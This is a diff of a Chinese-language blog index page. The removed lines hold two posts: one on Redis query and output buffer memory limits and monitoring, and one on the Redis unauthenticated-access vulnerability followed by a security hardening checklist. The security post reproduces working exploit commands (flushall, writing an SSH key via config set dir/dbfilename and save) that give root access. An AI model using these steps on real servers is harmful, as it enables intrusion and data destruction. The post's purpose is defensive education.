-<h3 id="query-buffer-size"><a href="#query-buffer-size" class="headerlink" title="query buffer size"></a>query buffer size</h3><p>  每个客户端query buffer自动动态调整使用内存大小的，范围在0~1GB之间；当某个客户端的query buffer使用超过1GB, server会立即关闭它，为避免过度使用内存，触发oom killer。<br>很遗憾query buffer的大小限制是硬编码的1GB,没法控制配置参数修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">server.h#163</div><div class="line">/* Protocol and I/O related defines */</div><div class="line">#define PROTO_MAX_QUERYBUF_LEN  (1024*1024*1024) /* 1GB max query buffer. */</div></pre></td></tr></table></figure></p>
-<p>如果程序的Key设计不合理，客户端使用大量的query buffer，这会导致redis server比较危险，很容易达到maxmeory限制，导致缓存数据被清空、数据无法写入和oom.</p>
-<h3 id="query-buffer不受maxmeory限制"><a href="#query-buffer不受maxmeory限制" class="headerlink" title="query buffer不受maxmeory限制"></a>query buffer不受maxmeory限制</h3><p>模拟100个客户端，连续写入大小为500MB(生产建议小于1KB)的Key; redis server设置maxmemory为4gb,但redis实际已用内存43gb(见used_memory)。<br> 结论是query buffer使用内存不受maxmemory的限制，这<a href="https://github.com/antirez/redis/issues/3423" target="_blank" rel="external">BUG</a>已经提给官方, 如不能限制redis使用的内存量，<br> 很易导致redis过度使用内存，无法控制出现oom.<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">127.0.0.1:6390&gt; info memory</div><div class="line"># Memory</div><div class="line">used_memory:46979129016</div><div class="line">used_memory_human:43.75G</div><div class="line">used_memory_rss:49898303488</div><div class="line">used_memory_rss_human:46.47G</div><div class="line">used_memory_peak:54796105584</div><div class="line">used_memory_peak_human:51.03G</div><div class="line">total_system_memory:134911881216</div><div class="line">total_system_memory_human:125.65G</div><div class="line">maxmemory:4294967296</div><div class="line">maxmemory_human:4.00G</div><div class="line">maxmemory_policy:allkeys-random</div><div class="line">mem_fragmentation_ratio:1.06</div><div class="line">mem_allocator:jemalloc-4.0.3</div><div class="line"></div><div class="line">## 当client断开后，rss会马上释放内存给OS</div></pre></td></tr></table></figure></p>
-<p>query buffer占用内存，会计入maxmemory, 如果达到maxmemory限制，会触发KEY的LRU淘汰或无法写入新数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">127.0.0.1:6390&gt; set a b</div><div class="line">(error) OOM command not allowed when used memory &gt; &apos;maxmemory&apos;.</div></pre></td></tr></table></figure></p>
-<h3 id="query-buffer使用查看"><a href="#query-buffer使用查看" class="headerlink" title="query buffer使用查看"></a>query buffer使用查看</h3><p>如前文介绍，用client list命令，观察qbuf和qbuf-free两个字段，就是client query buffer使用内存大小。<br>如下示例（省去部分字段）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">27.0.0.1:6390&gt; client list</div><div class="line">id=169  qbuf=128679888 qbuf-free=425984 obl=0 oll=0 omem=0 events=r cmd=NULL</div><div class="line">id=171  qbuf=128679888 qbuf-free=425984 obl=0 oll=0 omem=0 events=r cmd=NULL</div><div class="line">id=218  qbuf=128679888 qbuf-free=425984 obl=0 oll=0 omem=0 events=r cmd=NULL</div><div class="line">id=151  qbuf=128696272 qbuf-free=425984 obl=0 oll=0 omem=0 events=r cmd=NULL</div></pre></td></tr></table></figure></p>
-<h3 id="避免query-buffer过度使用"><a href="#避免query-buffer过度使用" class="headerlink" title="避免query buffer过度使用"></a>避免query buffer过度使用</h3><ul>
-<li>禁用大KEY，尽量保证key小于1KB; 虽redis支持512MB大小string。</li>
-<li>监控redis内存使用，如果忽高忽低，极有可能query buffer引起</li>
-<li>核心Redis集群定期收集client list并分析qbuf的使用量</li>
-<li>建议官方提供query buffer size的设置参数，以保证过载保护</li>
-</ul>
-<h2 id="Client-Output-buffer"><a href="#Client-Output-buffer" class="headerlink" title="Client Output buffer"></a>Client Output buffer</h2><p>客户端输出缓存区：执行命令所返回的结果会保存到output buffer，返回给客户端。<br>每个客户端都有2个query buffer：</p>
-<ul>
-<li>静态定长16KB的缓存区；主要快速存储返回比较小的结果；如简单的get等</li>
-<li>动态大小缓冲区；存储返回较大的结果，如大的集合类型:set/list/hash<br>因为静态的buffer，一般无性能和风险影响，这里简单介绍。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#define PROTO_REPLY_CHUNK_BYTES (16*1024) /* 16k output buffer */</div><div class="line"></div><div class="line">/* With multiplexing we need to take per-client state.</div><div class="line"> * Clients are taken in a linked list. */</div><div class="line">typedef struct client &#123;</div><div class="line">    uint64_t id;            /* Client incremental unique ID. */</div><div class="line">    redisDb *db;            /* Pointer to currently SELECTed DB. */</div><div class="line">    robj *name;             /* As set by CLIENT SETNAME. */</div><div class="line">    sds querybuf;           /* Buffer we use to accumulate client queries. */</div><div class="line">    list *reply;            /* List of reply objects to send to the client. */</div><div class="line"></div><div class="line">    /* Response buffer */</div><div class="line">    int bufpos;</div><div class="line">    char buf[PROTO_REPLY_CHUNK_BYTES];</div><div class="line">&#125; client;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>我们常说的output buffer都是指“动态大小的输出缓冲区”。</p>
-<h3 id="output-buffer大小限制"><a href="#output-buffer大小限制" class="headerlink" title="output buffer大小限制"></a>output buffer大小限制</h3><p>和qeury buffer不同，output buffer提供配置参数”client-output-buffer-limit”设置buffer的使用大小。<br>下面是limit的设置格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">client-output-buffer-limit normal 10mb 5mb 60</div><div class="line">client-output-buffer-limit slave 256mb 64mb 60</div><div class="line">client-output-buffer-limit pubsub 32mb 8mb 60</div></pre></td></tr></table></figure></p>
-<p>redis对3种不同客户端类型，可设置对应的buffer limit规则</p>
-<ul>
-<li>normal: 普通的客户端</li>
-<li>slave: 从库复制，连接到主库的客户端</li>
-<li>pubsub: 发布/订阅客户端</li>
-</ul>
-<p>设置的limit规则3个值： hard limit size, soft limit size, soft limit second;<br>只要客户端使用output buffer内存大小超过hard limit限制，redis会立即关闭此客户端；<br>使用buffer内存大小超过soft limit，并且持续soft limit秒数，redis也会立即关闭此客户端。<br>被关闭客户端信息会打印到redis日志文件中，格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">569:M 18 Jun 21:12:57.775 # Client id=972 addr=127.0.0.1:57934 fd=107 name= age=2 idle=0</div><div class="line">flags=O db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=0 obl=0 oll=366 omem=10492208 events=rw cmd=monitor</div><div class="line">scheduled to be closed ASAP for overcoming of output buffer limits.</div></pre></td></tr></table></figure></p>
-<h3 id="查看output-buffer使用"><a href="#查看output-buffer使用" class="headerlink" title="查看output buffer使用"></a>查看output buffer使用</h3><p>主要查开client list的obl(静态定长buffer)<br>omem: 当前客户端使用output buffer的内存字节数<br>如下客户端执行monitor命令(cmd=monitor), 已使用buffer内存是10492208，超过normal的hard limit 10mb<br>所以被redis关闭。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=972 addr=127.0.0.1:57934 idle=0 flags=O db=0 qbuf=0 qbuf-free=0 obl=0 oll=366 omem=10492208 events=rw cmd=monitor</div></pre></td></tr></table></figure></p>
-<p>另外output buffer受maxmemory的限制，基本不会超过maxmemory设置值</p>
-<h3 id="合理使用output-buffer"><a href="#合理使用output-buffer" class="headerlink" title="合理使用output buffer"></a>合理使用output buffer</h3><p>因为output buffer是每个客户端都有，如使用不当，每个占用1mb * 10000 clients就约使用10G内存；<br>所以要有效限制程序滥用。</p>
-<ul>
-<li>对于normal限制尽量小，可避免程序过度使用output buffer.</li>
-<li>监控redis used_memory如果抖动严重，极有可能</li>
-<li>增加slave的limit限制，避免slave同步线程被杀，导致无限循环同步数据；且slave线程和挂载的slave个数相同，理论只有几个</li>
-<li>禁止生产环境使用monitor命令，在高QPS环境下，monitor很快会产生output query使用</li>
-</ul>
-<h2 id="如何监控output-buffer和query-buffer"><a href="#如何监控output-buffer和query-buffer" class="headerlink" title="如何监控output buffer和query buffer"></a>如何监控output buffer和query buffer</h2><p>从前文可见, 如果业务使用redis不当，两个buffer有可能导致内存爆涨，redis缓存数据被全部淘汰，甚于出现oom.<br>那么怎么监测两个buffer的使用情况，提前发现系统的异常行为，并告警就显得很重要。<br>这里提供两种不同监控采集方法：</p>
-<ul>
-<li>通过采集client list输出，并分别统计求各所有客户端的(qbuf+  qbuf-free) 和 omem</li>
-<li>使用info的clients section中的client_biggest_input_buf和client_longest_output_list两个指标来监控告警</li>
-</ul>
-<p>第一种方法可精确统计当前时刻(buffer完全动态分配回收), redis使用的buffer内存容量；但要使用client list命令周期性统计，对于连接数较大redis实例，会导致数十毫秒卡顿(基准测试1w空连接，client list命令耗时约14.5ms)；<br>因为至少每隔几分钟要采集一次，在高并发实例下，这样耗时是不能被接受的，这就是常用的<a href="https://zh.wikipedia.org/wiki/%E8%A7%82%E6%B5%8B%E8%80%85%E6%95%88%E5%BA%94" target="_blank" rel="external">观察者效应</a>。<br>在<a href="http://open-falcon.org/" target="_blank" rel="external">open-falcon</a>的redis监控插件<a href="https://github.com/ZhuoRoger/redismon" target="_blank" rel="external">redismon</a>, 我们用第二个方法，通过info采集；<br>两个指标表示的含义:</p>
-<ul>
-<li>client_biggest_input_buf：当前实例所有客户端中，最大query buffer内存的字节数。 告警阈值建议10485760(10M),根据业务再调整。</li>
-<li>client_longest_output_list:当前实例所有客户端中, 最长output buffer的个数。告警阈值建议500长度（前文例子中monitor客户端长度是336，output buffer约10M），不过常用keys,monitor,或复制sync过程，会触发告警。</li>
-</ul>
-<p>两个指标只能反映，其中使用buffer最厉害那个客户端的使用的内存量；不能直接反映所有客户端使用两个buffer内存消耗。<br>但合理设置告警值，也能直接监测试redis系统用于buffer内存有异常，并跟踪定位异常导致的点；<br>因第二种方法，每分钟监控采集一次对系统无影响；虽没前者直观，也能定位发现问题了，觉得这就是一个tradeoff点。</p>
-<p>Redis两个客户端的Buffer就简单介绍这些。后续文章会讲redis的监控和buffer相样的故障问题。</p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/30/redis-client-two-buffers/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1217,42 +934,13 @@
 
       
         
-          
-            <p>去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。</p>
+          <p>去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。</p>
 <hr>
-<h2 id="Redis漏洞背景"><a href="#Redis漏洞背景" class="headerlink" title="Redis漏洞背景"></a>Redis漏洞背景</h2><p>去年11月antirez（redis’s father）在他博客<a href="http://antirez.com/news/96" target="_blank" rel="external">A few things about Redis security</a>一文详细说明这个问题。暴露的公网(或无访问控制)的redis实例，如果是无或弱密码设置，并且未对config,flushall,[bg]save命令未rename。可以被攻击者通过写redis RDB文件的方式来写SSH公钥，然后可以登陆redis服务器，获得root权限。</p>
-<h2 id="利用漏洞获取root过程模拟"><a href="#利用漏洞获取root过程模拟" class="headerlink" title="利用漏洞获取root过程模拟"></a>利用漏洞获取root过程模拟</h2><p>场景：攻击者所在sec-client外部服务器，探测到有公网的sec-redis.bj服务器，有一个无密码设置6379的redis实例。攻击者通过连接redis实例，最后获取redis服务器的root权限。<br>现在攻击者在client服务器不能登陆redis服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client ~]$ ssh root@sec-redis.bj</div><div class="line">root@sec-redis.bj&apos;s password:</div><div class="line">Permission denied, please try again.</div></pre></td></tr></table></figure></p>
-<h3 id="client服务器，生成公钥"><a href="#client服务器，生成公钥" class="headerlink" title="client服务器，生成公钥"></a>client服务器，生成公钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client ~]$ ssh-keygen -t rsa</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/home/zhuo/.ssh/id_rsa):</div><div class="line">Enter passphrase (empty for no passphrase):</div><div class="line">Enter same passphrase again:</div><div class="line">Your identification has been saved in /home/zhuo/.ssh/id_rsa.</div><div class="line">Your public key has been saved in /home/zhuo/.ssh/id_rsa.pub.</div><div class="line">The key fingerprint is:</div><div class="line">ef:b9:f5:34:a6:f4:62:fc:19:f6:46:17:ac:45:3e:72 zhuo@sec-client.bj</div><div class="line">The key&apos;s randomart image is:</div><div class="line">+--[ RSA 2048]----+</div><div class="line">|                 |</div><div class="line">|               . |</div><div class="line">|              +  |</div><div class="line">|             . E |</div><div class="line">|        S     = o|</div><div class="line">|         .   .  o|</div><div class="line">|          ..o *..|</div><div class="line">|         . ++B =.|</div><div class="line">|          +o.o=..|</div><div class="line">+-----------------+</div></pre></td></tr></table></figure>
-<p>把client的公钥写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$cd ~/.ssh/</div><div class="line">$(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; rediskey.txt</div></pre></td></tr></table></figure></p>
-<h3 id="把client的公钥写入redis服务器-root-ssh-authorized-keys，获取root权限"><a href="#把client的公钥写入redis服务器-root-ssh-authorized-keys，获取root权限" class="headerlink" title="把client的公钥写入redis服务器/root/.ssh/authorized_keys，获取root权限"></a>把client的公钥写入redis服务器/root/.ssh/authorized_keys，获取root权限</h3><p>清理redis的所有数据（再次强调，别在生产环境尝试）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ redis-cli  -h sec-redis.bj -p 6379 flushall</div><div class="line">OK</div></pre></td></tr></table></figure></p>
-<p>把client处理过的公钥文件rediskey.txt，写入redis的个字符串key中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat rediskey.txt | redis-cli  -h sec-redis.bj -p 6379 -x set dangerkey  </div><div class="line">OK</div></pre></td></tr></table></figure></p>
-<p>修改redis的dir目录设置，和rdb文件的名字dbfilename; 以达到save的rdb文件覆盖写入redis服务器的/root/.ssh/authorized_keys文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ redis-cli  -h sec-redis.bj -p 6379</div><div class="line">sec-redis.bj:6379&gt; config set dir /root/.ssh/</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt; config set dbfilename &quot;authorized_keys&quot;</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt; save</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt;</div></pre></td></tr></table></figure></p>
-<h3 id="完成root权限获取"><a href="#完成root权限获取" class="headerlink" title="完成root权限获取"></a>完成root权限获取</h3><p>攻击者可从client登录redis服务器，已获取root权限。当然使用其他账号启动，也存在类似问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client .ssh]$ hostname</div><div class="line">sec-client.bj</div><div class="line">[zhuo@sec-client .ssh]$ ssh root@sec-redis.bj</div><div class="line">Last login: Mon Jun  6 16:11:35 2016 from xx.xx.xx</div><div class="line">[root@c3-sec-redis ~]# hostname</div><div class="line">sec-redis.bj</div></pre></td></tr></table></figure></p>
-<h3 id="满足以下条件Redis实例存在此安全隐患"><a href="#满足以下条件Redis实例存在此安全隐患" class="headerlink" title="满足以下条件Redis实例存在此安全隐患"></a>满足以下条件Redis实例存在此安全隐患</h3><ul>
-<li>Redis使用root用户启动</li>
-<li>Redis未设置密码或密码过于简单</li>
-<li>Redis未重命名或禁用config, flushdb/flushall,[bg]save等命令</li>
-</ul>
-<p>加强Redis的安全性，提供以下安全规范。</p>
-<h2 id="Redis安全规范"><a href="#Redis安全规范" class="headerlink" title="Redis安全规范"></a>Redis安全规范</h2><p>这里列举Redis使用的安全check list.</p>
-<h3 id="信任的内网运行，尽量避免有公网访问"><a href="#信任的内网运行，尽量避免有公网访问" class="headerlink" title="信任的内网运行，尽量避免有公网访问"></a>信任的内网运行，尽量避免有公网访问</h3><p>redis自身只有一个密码控制访问，不能设置用户权限和IP限制。理论把redis运行在一个信任的网络环境中。</p>
-<h3 id="绑定Redis监听的网络接口"><a href="#绑定Redis监听的网络接口" class="headerlink" title="绑定Redis监听的网络接口"></a>绑定Redis监听的网络接口</h3><p>如果服务器有多个IP,可限定redis server监听的IP; 通过redis配置项bind，可同时绑定多个IP.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># By default, if no "bind" configuration directive is specified, Redis listens</span></div><div class="line"><span class="comment"># for connections from all the network interfaces available on the server.</span></div><div class="line"><span class="comment"># It is possible to listen to just one or multiple selected interfaces using</span></div><div class="line"><span class="comment"># the "bind" configuration directive, followed by one or more IP addresses.</span></div></pre></td></tr></table></figure></p>
-<h3 id="禁止root用户启动redis"><a href="#禁止root用户启动redis" class="headerlink" title="禁止root用户启动redis"></a>禁止root用户启动redis</h3><p>使用普通用户启动，安全性往往高很多；<br>业务程序永久别用root用户运行。</p>
-<h3 id="限制redis文件目录访问权限"><a href="#限制redis文件目录访问权限" class="headerlink" title="限制redis文件目录访问权限"></a>限制redis文件目录访问权限</h3><p>设置redis的主目录权限为700；如果redis配置文件独立于redis主目录，权限修改为600，因为Redis密码明文存储在配置文件中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$chmod</span> 700 /var/lib/redis   <span class="comment">#假设这是你redis目录</span></div><div class="line"><span class="variable">$chmod</span> 600 /etc/redis/redis.conf  <span class="comment">#假设这是你redis配置文件</span></div></pre></td></tr></table></figure></p>
-<h3 id="避免使用熟知端口"><a href="#避免使用熟知端口" class="headerlink" title="避免使用熟知端口"></a>避免使用熟知端口</h3><p>程序运行尽量避免使用熟知端口，降低被初级扫描的风险。</p>
-<h3 id="开启Redis密码认证，并设置高复杂度密码"><a href="#开启Redis密码认证，并设置高复杂度密码" class="headerlink" title="开启Redis密码认证，并设置高复杂度密码"></a>开启Redis密码认证，并设置高复杂度密码</h3><p>redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$vim</span> /etc/redis/redis.conf  </div><div class="line">requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</div></pre></td></tr></table></figure></p>
-<p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。<br>requirepass至少长度20位以上，为方便可使用一个特殊串sha256sum命令生成64位的无特殊字符串。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$echo</span> <span class="string">"dfasdERQEWRQEW31341dfadsfadsf"</span> | sha256sum</div><div class="line">af970b3691a0774b2a5adae1375e14<span class="built_in">cd</span>9e5db3591564f0eb789c2324cc02362f  -</div></pre></td></tr></table></figure></p>
-<h3 id="禁用或重命名危险命令"><a href="#禁用或重命名危险命令" class="headerlink" title="禁用或重命名危险命令"></a>禁用或重命名危险命令</h3><p>这个漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。<br>以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，<br>添加一个特殊的后缀。 这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># It is also possible to completely kill a command by renaming it into</span></div><div class="line"><span class="comment"># an empty string:</span></div><div class="line"><span class="comment">#</span></div><div class="line">rename-command CONFIG CONFIG_b9<span class="built_in">fc</span>8327c4dee7</div><div class="line">rename-command SHUTDOWN SHUTDOWN_b9<span class="built_in">fc</span>8327c4dee7</div><div class="line">rename-command FLUSHDB <span class="string">""</span></div><div class="line">rename-command FLUSHALL <span class="string">""</span></div></pre></td></tr></table></figure></p>
-<h3 id="禁止Redis中存储敏感的明文数据"><a href="#禁止Redis中存储敏感的明文数据" class="headerlink" title="禁止Redis中存储敏感的明文数据"></a>禁止Redis中存储敏感的明文数据</h3><p>Redis设计旨在提供高性能的KV服务，至少目前在权限访问控制和数据持久化方面比较弱化。所以禁止在Redis中存储或缓存，<br>敏感的明文数据。</p>
-<h3 id="安全监控"><a href="#安全监控" class="headerlink" title="安全监控"></a>安全监控</h3><ul>
-<li>建立<a href="http://drops.wooyun.org/papers/5968" target="_blank" rel="external">蜜罐网络</a>，有攻击尝试时，可及时发现。</li>
-<li>监控redis安全状态，cmdstat_auth cmdstat_flushdb/flushall监控报警。</li>
-</ul>
-<h2 id="Redis-Cluster不支持密码问题"><a href="#Redis-Cluster不支持密码问题" class="headerlink" title="Redis Cluster不支持密码问题"></a>Redis Cluster不支持密码问题</h2><p><a href="http://redis.io/topics/cluster-spec" target="_blank" rel="external">Redis 原生Cluster模式</a>最新3.2版本都不支持开启密码认证。<br>业内很多公司内网使用Cluster只能无密；目前通过前面其他安全设置项来保证，内网Redis Cluster的安全性。<br>至于未来希望Redis Cluster整个集群实例能支持同一个密码。社区之前对Redis他爸antirez提过，他<a href="https://groups.google.com/forum/#!msg/redis-db/Z8lMxTfDct8/Rny9BIK9xGYJ" target="_blank" rel="external">答复暂不支持</a>。</p>
-<h2 id="Redis3-2的保护模式"><a href="#Redis3-2的保护模式" class="headerlink" title="Redis3.2的保护模式"></a>Redis3.2的保护模式</h2><p>针对之前Redis版本，默认无bind和密码设置存在很大安全风险；Redis3.2版本提出新特性protected mode(保护模式)。<br>如果Redis在启动时，未开启bind和密码设置功能，只能通过回环地址本地访问，如果尝试远程访问redis，会提示以下错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">DENIED Redis is running protected mode because protected mode is enabled,</div><div class="line">no <span class="built_in">bind</span> address was specified, no authentication password is requested to clients.</div><div class="line">In this mode connections are only accepted from the loopback interface.</div></pre></td></tr></table></figure></p>
-<p>当然也可直接执行CONFIG SET protected-mode no，关闭保护模式。<br>类似这种设置在MongoDB3.2或MySQL5.7的默认安全配置都有。</p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/29/redis-sec/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
